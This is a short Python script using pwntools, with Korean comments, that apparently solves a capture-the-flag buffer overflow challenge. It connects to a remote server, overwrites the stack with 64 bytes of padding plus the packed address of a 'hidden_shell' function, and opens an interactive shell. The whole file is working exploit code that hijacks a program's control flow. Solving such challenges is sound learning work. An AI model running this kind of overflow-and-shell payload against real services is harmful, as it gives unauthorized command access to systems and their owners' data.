from pwn import * # pwntools 라이브러리 불러오기

p = remote('nicetop-pwn-server.dyhs.kr', 1001) # 서버와 연결

hidden = 0x080491c6 # hidden_shell 주소

payload = b'A'*64 # 더미 값
payload += p32(hidden) # hidden_shell의 주소를 패킹

p.sendline(payload) # 페이로드 보내기

p.interactive()